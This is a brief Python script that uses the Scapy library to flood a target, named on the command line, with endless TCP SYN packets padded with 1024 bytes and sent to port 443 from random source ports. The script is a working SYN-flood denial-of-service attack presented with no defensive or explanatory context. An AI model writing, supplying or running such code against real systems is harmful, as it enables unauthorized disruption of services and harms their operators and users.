from scapy.all import *

ip = IP(dst=sys.argv[1])
tcp = TCP(sport=RandShort(), dport=443, flags="S")
raw = Raw(b"X"*1024)
p = ip / tcp / raw
send(p, loop=1, verbose=0)
